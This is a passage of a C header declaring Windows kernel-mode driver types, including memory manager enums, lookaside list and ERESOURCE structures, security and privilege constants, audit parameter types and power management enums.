  MmHardwareCoherentCached,
  MmNonCachedUnordered,
  MmUSWCCached,
  MmMaximumCacheType,
  MmNotMapped = -1
} MEMORY_CACHING_TYPE;

typedef enum _MM_PAGE_PRIORITY {
  LowPagePriority,
  NormalPagePriority = 16,
  HighPagePriority = 32
} MM_PAGE_PRIORITY;

typedef enum _MM_SYSTEM_SIZE {
  MmSmallSystem,
  MmMediumSystem,
  MmLargeSystem
} MM_SYSTEMSIZE;

extern NTKERNELAPI BOOLEAN Mm64BitPhysicalAddress;
extern PVOID MmBadPointer;


/******************************************************************************
 *                            Executive Types                                 *
 ******************************************************************************/
#define EX_RUNDOWN_ACTIVE                 0x1
#define EX_RUNDOWN_COUNT_SHIFT            0x1
#define EX_RUNDOWN_COUNT_INC              (1 << EX_RUNDOWN_COUNT_SHIFT)

typedef struct _FAST_MUTEX {
  volatile LONG Count;
  PKTHREAD Owner;
  ULONG Contention;
  KEVENT Event;
  ULONG OldIrql;
} FAST_MUTEX, *PFAST_MUTEX;

typedef enum _SUITE_TYPE {
  SmallBusiness,
  Enterprise,
  BackOffice,
  CommunicationServer,
  TerminalServer,
  SmallBusinessRestricted,
  EmbeddedNT,
  DataCenter,
  SingleUserTS,
  Personal,
  Blade,
  EmbeddedRestricted,
  SecurityAppliance,
  StorageServer,
  ComputeServer,
  WHServer,
  MaxSuiteType
} SUITE_TYPE;

typedef enum _EX_POOL_PRIORITY {
  LowPoolPriority,
  LowPoolPrioritySpecialPoolOverrun = 8,
  LowPoolPrioritySpecialPoolUnderrun = 9,
  NormalPoolPriority = 16,
  NormalPoolPrioritySpecialPoolOverrun = 24,
  NormalPoolPrioritySpecialPoolUnderrun = 25,
  HighPoolPriority = 32,
  HighPoolPrioritySpecialPoolOverrun = 40,
  HighPoolPrioritySpecialPoolUnderrun = 41
} EX_POOL_PRIORITY;

#if !defined(_WIN64) && (defined(_NTDDK_) || defined(_NTIFS_) || defined(_NDIS_))
#define LOOKASIDE_ALIGN
#else
#define LOOKASIDE_ALIGN DECLSPEC_CACHEALIGN
#endif

typedef struct _LOOKASIDE_LIST_EX *PLOOKASIDE_LIST_EX;

typedef PVOID
(NTAPI *PALLOCATE_FUNCTION)(
  IN POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes,
  IN ULONG Tag);

typedef PVOID
(NTAPI *PALLOCATE_FUNCTION_EX)(
  IN POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes,
  IN ULONG Tag,
  IN OUT PLOOKASIDE_LIST_EX Lookaside);

typedef VOID
(NTAPI *PFREE_FUNCTION)(
  IN PVOID Buffer);

typedef VOID
(NTAPI *PFREE_FUNCTION_EX)(
  IN PVOID Buffer,
  IN OUT PLOOKASIDE_LIST_EX Lookaside);

typedef VOID
(NTAPI CALLBACK_FUNCTION)(
  IN PVOID CallbackContext OPTIONAL,
  IN PVOID Argument1 OPTIONAL,
  IN PVOID Argument2 OPTIONAL);
typedef CALLBACK_FUNCTION *PCALLBACK_FUNCTION;

#define GENERAL_LOOKASIDE_LAYOUT                \
    _ANONYMOUS_UNION union {                    \
        SLIST_HEADER ListHead;                  \
        SINGLE_LIST_ENTRY SingleListHead;       \
    } DUMMYUNIONNAME;                           \
    USHORT Depth;                               \
    USHORT MaximumDepth;                        \
    ULONG TotalAllocates;                       \
    _ANONYMOUS_UNION union {                    \
        ULONG AllocateMisses;                   \
        ULONG AllocateHits;                     \
    } DUMMYUNIONNAME2;                          \
    ULONG TotalFrees;                           \
    _ANONYMOUS_UNION union {                    \
        ULONG FreeMisses;                       \
        ULONG FreeHits;                         \
    } DUMMYUNIONNAME3;                          \
    POOL_TYPE Type;                             \
    ULONG Tag;                                  \
    ULONG Size;                                 \
    _ANONYMOUS_UNION union {                    \
        PALLOCATE_FUNCTION_EX AllocateEx;       \
        PALLOCATE_FUNCTION Allocate;            \
    } DUMMYUNIONNAME4;                          \
    _ANONYMOUS_UNION union {                    \
        PFREE_FUNCTION_EX FreeEx;               \
        PFREE_FUNCTION Free;                    \
    } DUMMYUNIONNAME5;                          \
    LIST_ENTRY ListEntry;                       \
    ULONG LastTotalAllocates;                   \
    _ANONYMOUS_UNION union {                    \
        ULONG LastAllocateMisses;               \
        ULONG LastAllocateHits;                 \
    } DUMMYUNIONNAME6;                          \
    ULONG Future[2];

typedef struct LOOKASIDE_ALIGN _GENERAL_LOOKASIDE {
  GENERAL_LOOKASIDE_LAYOUT
} GENERAL_LOOKASIDE, *PGENERAL_LOOKASIDE;

typedef struct _GENERAL_LOOKASIDE_POOL {
  GENERAL_LOOKASIDE_LAYOUT
} GENERAL_LOOKASIDE_POOL, *PGENERAL_LOOKASIDE_POOL;

#define LOOKASIDE_CHECK(f)  \
    C_ASSERT(FIELD_OFFSET(GENERAL_LOOKASIDE,f) == FIELD_OFFSET(GENERAL_LOOKASIDE_POOL,f))

LOOKASIDE_CHECK(TotalFrees);
LOOKASIDE_CHECK(Tag);
LOOKASIDE_CHECK(Future);

typedef struct _PAGED_LOOKASIDE_LIST {
  GENERAL_LOOKASIDE L;
#if !defined(_AMD64_) && !defined(_IA64_)
  FAST_MUTEX Lock__ObsoleteButDoNotDelete;
#endif
} PAGED_LOOKASIDE_LIST, *PPAGED_LOOKASIDE_LIST;

typedef struct LOOKASIDE_ALIGN _NPAGED_LOOKASIDE_LIST {
  GENERAL_LOOKASIDE L;
#if !defined(_AMD64_) && !defined(_IA64_)
  KSPIN_LOCK Lock__ObsoleteButDoNotDelete;
#endif
} NPAGED_LOOKASIDE_LIST, *PNPAGED_LOOKASIDE_LIST;

#define LOOKASIDE_MINIMUM_BLOCK_SIZE (RTL_SIZEOF_THROUGH_FIELD (SLIST_ENTRY, Next))

typedef struct _LOOKASIDE_LIST_EX {
  GENERAL_LOOKASIDE_POOL L;
} LOOKASIDE_LIST_EX;

#if (NTDDI_VERSION >= NTDDI_VISTA)

#define EX_LOOKASIDE_LIST_EX_FLAGS_RAISE_ON_FAIL 0x00000001UL
#define EX_LOOKASIDE_LIST_EX_FLAGS_FAIL_NO_RAISE 0x00000002UL

#define EX_MAXIMUM_LOOKASIDE_DEPTH_BASE          256
#define EX_MAXIMUM_LOOKASIDE_DEPTH_LIMIT         1024

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

typedef struct _EX_RUNDOWN_REF {
  _ANONYMOUS_UNION union {
    volatile ULONG_PTR Count;
    volatile PVOID Ptr;
  } DUMMYUNIONNAME;
} EX_RUNDOWN_REF, *PEX_RUNDOWN_REF;

typedef struct _EX_RUNDOWN_REF_CACHE_AWARE *PEX_RUNDOWN_REF_CACHE_AWARE;

typedef enum _WORK_QUEUE_TYPE {
  CriticalWorkQueue,
  DelayedWorkQueue,
  HyperCriticalWorkQueue,
  NormalWorkQueue,
  BackgroundWorkQueue,
  RealTimeWorkQueue,
  SuperCriticalWorkQueue,
  MaximumWorkQueue,
  CustomPriorityWorkQueue = 32
} WORK_QUEUE_TYPE;

typedef VOID
(NTAPI WORKER_THREAD_ROUTINE)(
  IN PVOID Parameter);
typedef WORKER_THREAD_ROUTINE *PWORKER_THREAD_ROUTINE;

typedef struct _WORK_QUEUE_ITEM {
  LIST_ENTRY List;
  PWORKER_THREAD_ROUTINE WorkerRoutine;
  volatile PVOID Parameter;
} WORK_QUEUE_ITEM, *PWORK_QUEUE_ITEM;

typedef ULONG_PTR ERESOURCE_THREAD, *PERESOURCE_THREAD;

typedef struct _OWNER_ENTRY {
  ERESOURCE_THREAD OwnerThread;
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      ULONG IoPriorityBoosted:1;
      ULONG OwnerReferenced:1;
      ULONG OwnerCount:30;
    } DUMMYSTRUCTNAME;
    ULONG TableSize;
  } DUMMYUNIONNAME;
} OWNER_ENTRY, *POWNER_ENTRY;

typedef struct _ERESOURCE {
  LIST_ENTRY SystemResourcesList;
  POWNER_ENTRY OwnerTable;
  SHORT ActiveCount;
  USHORT Flag;
  volatile PKSEMAPHORE SharedWaiters;
  volatile PKEVENT ExclusiveWaiters;
  OWNER_ENTRY OwnerEntry;
  ULONG ActiveEntries;
  ULONG ContentionCount;
  ULONG NumberOfSharedWaiters;
  ULONG NumberOfExclusiveWaiters;
#if defined(_WIN64)
  PVOID Reserved2;
#endif
  _ANONYMOUS_UNION union {
    PVOID Address;
    ULONG_PTR CreatorBackTraceIndex;
  } DUMMYUNIONNAME;
  KSPIN_LOCK SpinLock;
} ERESOURCE, *PERESOURCE;

/* ERESOURCE.Flag */
#define ResourceNeverExclusive            0x0010
#define ResourceReleaseByOtherThread      0x0020
#define ResourceOwnedExclusive            0x0080

#define RESOURCE_HASH_TABLE_SIZE          64

typedef struct _RESOURCE_HASH_ENTRY {
  LIST_ENTRY ListEntry;
  PVOID Address;
  ULONG ContentionCount;
  ULONG Number;
} RESOURCE_HASH_ENTRY, *PRESOURCE_HASH_ENTRY;

typedef struct _RESOURCE_PERFORMANCE_DATA {
  ULONG ActiveResourceCount;
  ULONG TotalResourceCount;
  ULONG ExclusiveAcquire;
  ULONG SharedFirstLevel;
  ULONG SharedSecondLevel;
  ULONG StarveFirstLevel;
  ULONG StarveSecondLevel;
  ULONG WaitForExclusive;
  ULONG OwnerTableExpands;
  ULONG MaximumTableExpand;
  LIST_ENTRY HashTable[RESOURCE_HASH_TABLE_SIZE];
} RESOURCE_PERFORMANCE_DATA, *PRESOURCE_PERFORMANCE_DATA;

/* Global debug flag */
#if DEVL
extern ULONG NtGlobalFlag;
#define IF_NTOS_DEBUG(FlagName) if (NtGlobalFlag & (FLG_##FlagName))
#else
#define IF_NTOS_DEBUG(FlagName) if(FALSE)
#endif

/******************************************************************************
 *                            Security Manager Types                          *
 ******************************************************************************/

/* Simple types */
typedef PVOID PSECURITY_DESCRIPTOR;
typedef ULONG SECURITY_INFORMATION, *PSECURITY_INFORMATION;
typedef ULONG ACCESS_MASK, *PACCESS_MASK;
typedef PVOID PACCESS_TOKEN;
typedef PVOID PSID;

#define DELETE                           0x00010000L
#define READ_CONTROL                     0x00020000L
#define WRITE_DAC                        0x00040000L
#define WRITE_OWNER                      0x00080000L
#define SYNCHRONIZE                      0x00100000L
#define STANDARD_RIGHTS_REQUIRED         0x000F0000L
#define STANDARD_RIGHTS_READ             READ_CONTROL
#define STANDARD_RIGHTS_WRITE            READ_CONTROL
#define STANDARD_RIGHTS_EXECUTE          READ_CONTROL
#define STANDARD_RIGHTS_ALL              0x001F0000L
#define SPECIFIC_RIGHTS_ALL              0x0000FFFFL
#define ACCESS_SYSTEM_SECURITY           0x01000000L
#define MAXIMUM_ALLOWED                  0x02000000L
#define GENERIC_READ                     0x80000000L
#define GENERIC_WRITE                    0x40000000L
#define GENERIC_EXECUTE                  0x20000000L
#define GENERIC_ALL                      0x10000000L

typedef struct _GENERIC_MAPPING {
  ACCESS_MASK GenericRead;
  ACCESS_MASK GenericWrite;
  ACCESS_MASK GenericExecute;
  ACCESS_MASK GenericAll;
} GENERIC_MAPPING, *PGENERIC_MAPPING;

#define ACL_REVISION                      2
#define ACL_REVISION_DS                   4

#define ACL_REVISION1                     1
#define ACL_REVISION2                     2
#define ACL_REVISION3                     3
#define ACL_REVISION4                     4
#define MIN_ACL_REVISION                  ACL_REVISION2
#define MAX_ACL_REVISION                  ACL_REVISION4

typedef struct _ACL {
  UCHAR AclRevision;
  UCHAR Sbz1;
  USHORT AclSize;
  USHORT AceCount;
  USHORT Sbz2;
} ACL, *PACL;

/* Current security descriptor revision value */
#define SECURITY_DESCRIPTOR_REVISION     (1)
#define SECURITY_DESCRIPTOR_REVISION1    (1)

/* Privilege attributes */
#define SE_PRIVILEGE_ENABLED_BY_DEFAULT (0x00000001L)
#define SE_PRIVILEGE_ENABLED            (0x00000002L)
#define SE_PRIVILEGE_REMOVED            (0X00000004L)
#define SE_PRIVILEGE_USED_FOR_ACCESS    (0x80000000L)

#define SE_PRIVILEGE_VALID_ATTRIBUTES   (SE_PRIVILEGE_ENABLED_BY_DEFAULT | \
                                         SE_PRIVILEGE_ENABLED            | \
                                         SE_PRIVILEGE_REMOVED            | \
                                         SE_PRIVILEGE_USED_FOR_ACCESS)

#include <pshpack4.h>
typedef struct _LUID_AND_ATTRIBUTES {
  LUID Luid;
  ULONG Attributes;
} LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES;
#include <poppack.h>

typedef LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES_ARRAY[ANYSIZE_ARRAY];
typedef LUID_AND_ATTRIBUTES_ARRAY *PLUID_AND_ATTRIBUTES_ARRAY;

/* Privilege sets */
#define PRIVILEGE_SET_ALL_NECESSARY (1)

typedef struct _PRIVILEGE_SET {
  ULONG PrivilegeCount;
  ULONG Control;
  LUID_AND_ATTRIBUTES Privilege[ANYSIZE_ARRAY];
} PRIVILEGE_SET,*PPRIVILEGE_SET;

typedef enum _SECURITY_IMPERSONATION_LEVEL {
  SecurityAnonymous,
  SecurityIdentification,
  SecurityImpersonation,
  SecurityDelegation
} SECURITY_IMPERSONATION_LEVEL, * PSECURITY_IMPERSONATION_LEVEL;

#define SECURITY_MAX_IMPERSONATION_LEVEL SecurityDelegation
#define SECURITY_MIN_IMPERSONATION_LEVEL SecurityAnonymous
#define DEFAULT_IMPERSONATION_LEVEL SecurityImpersonation
#define VALID_IMPERSONATION_LEVEL(Level) (((Level) >= SECURITY_MIN_IMPERSONATION_LEVEL) && ((Level) <= SECURITY_MAX_IMPERSONATION_LEVEL))

#define SECURITY_DYNAMIC_TRACKING (TRUE)
#define SECURITY_STATIC_TRACKING (FALSE)

typedef BOOLEAN SECURITY_CONTEXT_TRACKING_MODE, *PSECURITY_CONTEXT_TRACKING_MODE;

typedef struct _SECURITY_QUALITY_OF_SERVICE {
  ULONG Length;
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
  SECURITY_CONTEXT_TRACKING_MODE ContextTrackingMode;
  BOOLEAN EffectiveOnly;
} SECURITY_QUALITY_OF_SERVICE, *PSECURITY_QUALITY_OF_SERVICE;

typedef struct _SE_IMPERSONATION_STATE {
  PACCESS_TOKEN Token;
  BOOLEAN CopyOnOpen;
  BOOLEAN EffectiveOnly;
  SECURITY_IMPERSONATION_LEVEL Level;
} SE_IMPERSONATION_STATE, *PSE_IMPERSONATION_STATE;

#define OWNER_SECURITY_INFORMATION       (0x00000001L)
#define GROUP_SECURITY_INFORMATION       (0x00000002L)
#define DACL_SECURITY_INFORMATION        (0x00000004L)
#define SACL_SECURITY_INFORMATION        (0x00000008L)
#define LABEL_SECURITY_INFORMATION       (0x00000010L)

#define PROTECTED_DACL_SECURITY_INFORMATION     (0x80000000L)
#define PROTECTED_SACL_SECURITY_INFORMATION     (0x40000000L)
#define UNPROTECTED_DACL_SECURITY_INFORMATION   (0x20000000L)
#define UNPROTECTED_SACL_SECURITY_INFORMATION   (0x10000000L)

typedef enum _SECURITY_OPERATION_CODE {
  SetSecurityDescriptor,
  QuerySecurityDescriptor,
  DeleteSecurityDescriptor,
  AssignSecurityDescriptor
} SECURITY_OPERATION_CODE, *PSECURITY_OPERATION_CODE;

#define INITIAL_PRIVILEGE_COUNT           3

typedef struct _INITIAL_PRIVILEGE_SET {
  ULONG PrivilegeCount;
  ULONG Control;
  LUID_AND_ATTRIBUTES Privilege[INITIAL_PRIVILEGE_COUNT];
} INITIAL_PRIVILEGE_SET, * PINITIAL_PRIVILEGE_SET;

#define SE_MIN_WELL_KNOWN_PRIVILEGE         2
#define SE_CREATE_TOKEN_PRIVILEGE           2
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE     3
#define SE_LOCK_MEMORY_PRIVILEGE            4
#define SE_INCREASE_QUOTA_PRIVILEGE         5
#define SE_MACHINE_ACCOUNT_PRIVILEGE        6
#define SE_TCB_PRIVILEGE                    7
#define SE_SECURITY_PRIVILEGE               8
#define SE_TAKE_OWNERSHIP_PRIVILEGE         9
#define SE_LOAD_DRIVER_PRIVILEGE            10
#define SE_SYSTEM_PROFILE_PRIVILEGE         11
#define SE_SYSTEMTIME_PRIVILEGE             12
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE    13
#define SE_INC_BASE_PRIORITY_PRIVILEGE      14
#define SE_CREATE_PAGEFILE_PRIVILEGE        15
#define SE_CREATE_PERMANENT_PRIVILEGE       16
#define SE_BACKUP_PRIVILEGE                 17
#define SE_RESTORE_PRIVILEGE                18
#define SE_SHUTDOWN_PRIVILEGE               19
#define SE_DEBUG_PRIVILEGE                  20
#define SE_AUDIT_PRIVILEGE                  21
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE     22
#define SE_CHANGE_NOTIFY_PRIVILEGE          23
#define SE_REMOTE_SHUTDOWN_PRIVILEGE        24
#define SE_UNDOCK_PRIVILEGE                 25
#define SE_SYNC_AGENT_PRIVILEGE             26
#define SE_ENABLE_DELEGATION_PRIVILEGE      27
#define SE_MANAGE_VOLUME_PRIVILEGE          28
#define SE_IMPERSONATE_PRIVILEGE            29
#define SE_CREATE_GLOBAL_PRIVILEGE          30
#define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE 31
#define SE_RELABEL_PRIVILEGE                32
#define SE_INC_WORKING_SET_PRIVILEGE        33
#define SE_TIME_ZONE_PRIVILEGE              34
#define SE_CREATE_SYMBOLIC_LINK_PRIVILEGE   35
#define SE_MAX_WELL_KNOWN_PRIVILEGE         SE_CREATE_SYMBOLIC_LINK_PRIVILEGE

typedef struct _SECURITY_SUBJECT_CONTEXT {
  PACCESS_TOKEN ClientToken;
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
  PACCESS_TOKEN PrimaryToken;
  PVOID ProcessAuditId;
} SECURITY_SUBJECT_CONTEXT, *PSECURITY_SUBJECT_CONTEXT;

typedef struct _ACCESS_STATE {
  LUID OperationID;
  BOOLEAN SecurityEvaluated;
  BOOLEAN GenerateAudit;
  BOOLEAN GenerateOnClose;
  BOOLEAN PrivilegesAllocated;
  ULONG Flags;
  ACCESS_MASK RemainingDesiredAccess;
  ACCESS_MASK PreviouslyGrantedAccess;
  ACCESS_MASK OriginalDesiredAccess;
  SECURITY_SUBJECT_CONTEXT SubjectSecurityContext;
  PSECURITY_DESCRIPTOR SecurityDescriptor;
  PVOID AuxData;
  union {
    INITIAL_PRIVILEGE_SET InitialPrivilegeSet;
    PRIVILEGE_SET PrivilegeSet;
  } Privileges;
  BOOLEAN AuditPrivileges;
  UNICODE_STRING ObjectName;
  UNICODE_STRING ObjectTypeName;
} ACCESS_STATE, *PACCESS_STATE;

typedef VOID
(NTAPI *PNTFS_DEREF_EXPORTED_SECURITY_DESCRIPTOR)(
  IN PVOID Vcb,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

#ifndef _NTLSA_IFS_

#ifndef _NTLSA_AUDIT_
#define _NTLSA_AUDIT_

#define SE_MAX_AUDIT_PARAMETERS 32
#define SE_MAX_GENERIC_AUDIT_PARAMETERS 28

#define SE_ADT_OBJECT_ONLY 0x1

#define SE_ADT_PARAMETERS_SELF_RELATIVE    0x00000001
#define SE_ADT_PARAMETERS_SEND_TO_LSA      0x00000002
#define SE_ADT_PARAMETER_EXTENSIBLE_AUDIT  0x00000004
#define SE_ADT_PARAMETER_GENERIC_AUDIT     0x00000008
#define SE_ADT_PARAMETER_WRITE_SYNCHRONOUS 0x00000010

#define LSAP_SE_ADT_PARAMETER_ARRAY_TRUE_SIZE(Parameters) \
  ( sizeof(SE_ADT_PARAMETER_ARRAY) - sizeof(SE_ADT_PARAMETER_ARRAY_ENTRY) * \
    (SE_MAX_AUDIT_PARAMETERS - Parameters->ParameterCount) )

typedef enum _SE_ADT_PARAMETER_TYPE {
  SeAdtParmTypeNone = 0,
  SeAdtParmTypeString,
  SeAdtParmTypeFileSpec,
  SeAdtParmTypeUlong,
  SeAdtParmTypeSid,
  SeAdtParmTypeLogonId,
  SeAdtParmTypeNoLogonId,
  SeAdtParmTypeAccessMask,
  SeAdtParmTypePrivs,
  SeAdtParmTypeObjectTypes,
  SeAdtParmTypeHexUlong,
  SeAdtParmTypePtr,
  SeAdtParmTypeTime,
  SeAdtParmTypeGuid,
  SeAdtParmTypeLuid,
  SeAdtParmTypeHexInt64,
  SeAdtParmTypeStringList,
  SeAdtParmTypeSidList,
  SeAdtParmTypeDuration,
  SeAdtParmTypeUserAccountControl,
  SeAdtParmTypeNoUac,
  SeAdtParmTypeMessage,
  SeAdtParmTypeDateTime,
  SeAdtParmTypeSockAddr,
  SeAdtParmTypeSD,
  SeAdtParmTypeLogonHours,
  SeAdtParmTypeLogonIdNoSid,
  SeAdtParmTypeUlongNoConv,
  SeAdtParmTypeSockAddrNoPort,
  SeAdtParmTypeAccessReason,
  SeAdtParmTypeStagingReason,
  SeAdtParmTypeResourceAttribute,
  SeAdtParmTypeClaims,
  SeAdtParmTypeLogonIdAsSid,
  SeAdtParmTypeMultiSzString,
  SeAdtParmTypeLogonIdEx
} SE_ADT_PARAMETER_TYPE, *PSE_ADT_PARAMETER_TYPE;

typedef struct _SE_ADT_OBJECT_TYPE {
  GUID ObjectType;
  USHORT Flags;
  USHORT Level;
  ACCESS_MASK AccessMask;
} SE_ADT_OBJECT_TYPE, *PSE_ADT_OBJECT_TYPE;

typedef struct _SE_ADT_PARAMETER_ARRAY_ENTRY {
  SE_ADT_PARAMETER_TYPE Type;
  ULONG Length;
  ULONG_PTR Data[2];
  PVOID Address;
} SE_ADT_PARAMETER_ARRAY_ENTRY, *PSE_ADT_PARAMETER_ARRAY_ENTRY;

typedef struct _SE_ADT_ACCESS_REASON {
  ACCESS_MASK AccessMask;
  ULONG AccessReasons[32];
  ULONG ObjectTypeIndex;
  ULONG AccessGranted;
  PSECURITY_DESCRIPTOR SecurityDescriptor;
} SE_ADT_ACCESS_REASON, *PSE_ADT_ACCESS_REASON;

typedef struct _SE_ADT_PARAMETER_ARRAY {
  ULONG CategoryId;
  ULONG AuditId;
  ULONG ParameterCount;
  ULONG Length;
  USHORT FlatSubCategoryId;
  USHORT Type;
  ULONG Flags;
  SE_ADT_PARAMETER_ARRAY_ENTRY Parameters[ SE_MAX_AUDIT_PARAMETERS ];
} SE_ADT_PARAMETER_ARRAY, *PSE_ADT_PARAMETER_ARRAY;

#endif /* !_NTLSA_AUDIT_ */
#endif /* !_NTLSA_IFS_ */

/******************************************************************************
 *                            Power Management Support Types                  *
 ******************************************************************************/

#ifndef _PO_DDK_
#define _PO_DDK_

#define PO_CB_SYSTEM_POWER_POLICY                0
#define PO_CB_AC_STATUS                          1
#define PO_CB_BUTTON_COLLISION                   2
#define PO_CB_SYSTEM_STATE_LOCK                  3
#define PO_CB_LID_SWITCH_STATE                   4
#define PO_CB_PROCESSOR_POWER_POLICY             5

/* Power States/Levels */
typedef enum _SYSTEM_POWER_STATE {
  PowerSystemUnspecified = 0,
  PowerSystemWorking,
  PowerSystemSleeping1,
  PowerSystemSleeping2,
  PowerSystemSleeping3,
  PowerSystemHibernate,
  PowerSystemShutdown,
  PowerSystemMaximum
} SYSTEM_POWER_STATE, *PSYSTEM_POWER_STATE;

#define POWER_SYSTEM_MAXIMUM PowerSystemMaximum

typedef enum _POWER_INFORMATION_LEVEL {
  SystemPowerPolicyAc,
  SystemPowerPolicyDc,
  VerifySystemPolicyAc,
  VerifySystemPolicyDc,
  SystemPowerCapabilities,
  SystemBatteryState,
  SystemPowerStateHandler,
  ProcessorStateHandler,
  SystemPowerPolicyCurrent,
  AdministratorPowerPolicy,
  SystemReserveHiberFile,
  ProcessorInformation,
  SystemPowerInformation,
  ProcessorStateHandler2,
  LastWakeTime,
  LastSleepTime,
  SystemExecutionState,
  SystemPowerStateNotifyHandler,
  ProcessorPowerPolicyAc,
  ProcessorPowerPolicyDc,
  VerifyProcessorPowerPolicyAc,
  VerifyProcessorPowerPolicyDc,
  ProcessorPowerPolicyCurrent,
  SystemPowerStateLogging,
  SystemPowerLoggingEntry,
  SetPowerSettingValue,
  NotifyUserPowerSetting,
  PowerInformationLevelUnused0,
  SystemMonitorHiberBootPowerOff,
  SystemVideoState,
  TraceApplicationPowerMessage,
  TraceApplicationPowerMessageEnd,
  ProcessorPerfStates,
  ProcessorIdleStates,
  ProcessorCap,
  SystemWakeSource,
  SystemHiberFileInformation,
  TraceServicePowerMessage,
  ProcessorLoad,
  PowerShutdownNotification,
  MonitorCapabilities,
  SessionPowerInit,
  SessionDisplayState,
  PowerRequestCreate,
  PowerRequestAction,
  GetPowerRequestList,
  ProcessorInformationEx,
  NotifyUserModeLegacyPowerEvent,
  GroupPark,
  ProcessorIdleDomains,
  WakeTimerList,
  SystemHiberFileSize,
  ProcessorIdleStatesHv,
  ProcessorPerfStatesHv,
  ProcessorPerfCapHv,
  ProcessorSetIdle,
  LogicalProcessorIdling,
  UserPresence,
  PowerSettingNotificationName,
  GetPowerSettingValue,
  IdleResiliency,
  SessionRITState,
  SessionConnectNotification,
  SessionPowerCleanup,
  SessionLockState,
  SystemHiberbootState,
  PlatformInformation,
  PdcInvocation,
  MonitorInvocation,
  FirmwareTableInformationRegistered,
  SetShutdownSelectedTime,
  SuspendResumeInvocation,
  PlmPowerRequestCreate,
  ScreenOff,
  CsDeviceNotification,
  PlatformRole,
  LastResumePerformance,
  DisplayBurst,
  ExitLatencySamplingPercentage,
  RegisterSpmPowerSettings,
  PlatformIdleStates,
  ProcessorIdleVeto,
  PlatformIdleVeto,
  SystemBatteryStatePrecise,
  ThermalEvent,
  PowerRequestActionInternal,
  BatteryDeviceState,
  PowerInformationInternal,
  ThermalStandby,
  SystemHiberFileType,
  PhysicalPowerButtonPress,
  QueryPotentialDripsConstraint,
  EnergyTrackerCreate,
  EnergyTrackerQuery,
  UpdateBlackBoxRecorder,
  SessionAllowExternalDmaDevices,
  PowerInformationLevelMaximum
} POWER_INFORMATION_LEVEL;

typedef enum {
  PowerActionNone = 0,
  PowerActionReserved,
  PowerActionSleep,
  PowerActionHibernate,
  PowerActionShutdown,
  PowerActionShutdownReset,
  PowerActionShutdownOff,
  PowerActionWarmEject,
  PowerActionDisplayOff
} POWER_ACTION, *PPOWER_ACTION;

typedef enum _DEVICE_POWER_STATE {
  PowerDeviceUnspecified = 0,
  PowerDeviceD0,
  PowerDeviceD1,
  PowerDeviceD2,
  PowerDeviceD3,
  PowerDeviceMaximum
} DEVICE_POWER_STATE, *PDEVICE_POWER_STATE;

typedef enum _MONITOR_DISPLAY_STATE {
  PowerMonitorOff = 0,
  PowerMonitorOn,
  PowerMonitorDim
} MONITOR_DISPLAY_STATE, *PMONITOR_DISPLAY_STATE;

typedef union _POWER_STATE {
  SYSTEM_POWER_STATE SystemState;
  DEVICE_POWER_STATE DeviceState;
} POWER_STATE, *PPOWER_STATE;

typedef enum _POWER_STATE_TYPE {
  SystemPowerState = 0,
  DevicePowerState
} POWER_STATE_TYPE, *PPOWER_STATE_TYPE;

#if (NTDDI_VERSION >= NTDDI_VISTA)
typedef struct _SYSTEM_POWER_STATE_CONTEXT {
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      ULONG Reserved1:8;
      ULONG TargetSystemState:4;
      ULONG EffectiveSystemState:4;
      ULONG CurrentSystemState:4;
      ULONG IgnoreHibernationPath:1;
      ULONG PseudoTransition:1;
      ULONG Reserved2:10;
    } DUMMYSTRUCTNAME;
    ULONG ContextAsUlong;
  } DUMMYUNIONNAME;
} SYSTEM_POWER_STATE_CONTEXT, *PSYSTEM_POWER_STATE_CONTEXT;
#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)
typedef struct _COUNTED_REASON_CONTEXT {
  ULONG Version;
  ULONG Flags;
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      UNICODE_STRING ResourceFileName;
      USHORT ResourceReasonId;
      ULONG StringCount;
      PUNICODE_STRING ReasonStrings;
    } DUMMYSTRUCTNAME;
    UNICODE_STRING SimpleString;
  } DUMMYUNIONNAME;
} COUNTED_REASON_CONTEXT, *PCOUNTED_REASON_CONTEXT;
#endif

#define IOCTL_QUERY_DEVICE_POWER_STATE  \
        CTL_CODE(FILE_DEVICE_BATTERY, 0x0, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_SET_DEVICE_WAKE           \
        CTL_CODE(FILE_DEVICE_BATTERY, 0x1, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_CANCEL_DEVICE_WAKE        \
        CTL_CODE(FILE_DEVICE_BATTERY, 0x2, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define ES_SYSTEM_REQUIRED                       0x00000001
#define ES_DISPLAY_REQUIRED                      0x00000002
#define ES_USER_PRESENT                          0x00000004
#define ES_CONTINUOUS                            0x80000000

typedef ULONG EXECUTION_STATE, *PEXECUTION_STATE;

typedef enum {
  LT_DONT_CARE,
  LT_LOWEST_LATENCY
} LATENCY_TIME;

#if (_WIN32_WINNT >= _WIN32_WINNT_WIN7)
#define DIAGNOSTIC_REASON_VERSION                0
#define DIAGNOSTIC_REASON_SIMPLE_STRING          0x00000001
#define DIAGNOSTIC_REASON_DETAILED_STRING        0x00000002
#define DIAGNOSTIC_REASON_NOT_SPECIFIED          0x80000000
#define DIAGNOSTIC_REASON_INVALID_FLAGS          (~0x80000003)
#endif

#define POWER_REQUEST_CONTEXT_VERSION            0
#define POWER_REQUEST_CONTEXT_SIMPLE_STRING      0x00000001
#define POWER_REQUEST_CONTEXT_DETAILED_STRING    0x00000002

#define PowerRequestMaximum                      3

typedef enum _POWER_REQUEST_TYPE {
  PowerRequestDisplayRequired,
  PowerRequestSystemRequired,
  PowerRequestAwayModeRequired,
  PowerRequestExecutionRequired
} POWER_REQUEST_TYPE, *PPOWER_REQUEST_TYPE;

